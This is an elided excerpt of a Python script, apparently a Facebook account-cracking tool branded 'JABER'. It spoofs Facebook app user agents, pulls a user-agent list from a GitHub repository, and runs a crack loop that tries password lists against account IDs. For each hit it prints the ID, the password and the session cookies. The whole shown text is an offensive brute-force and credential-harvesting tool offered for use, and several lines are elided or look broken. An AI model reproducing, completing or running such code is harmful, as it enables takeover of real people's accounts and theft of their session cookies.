...
#ACTIVE FILE CLONING
#ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT USE JABER 10000 
...
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.124 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]",]
...
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3709 Build/SKQ1.221119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A605K Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64",]
ugen2=[]
ugen=[]
cokbrut=[]
...
for xd in range(10000):
	...
	f='/110.021.0028; ProJABER/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/JABER-143/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
def result():
	...
	if kz in ['1','01']:
		...
		except JABERNotFoundError:
			print(' JABER Not Found')
			time.sleep(3)
			back()
		if len(vin)==0:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[😻JABER😻] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#JABER-King
				print(f'\r\033[0;92m[JABER-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
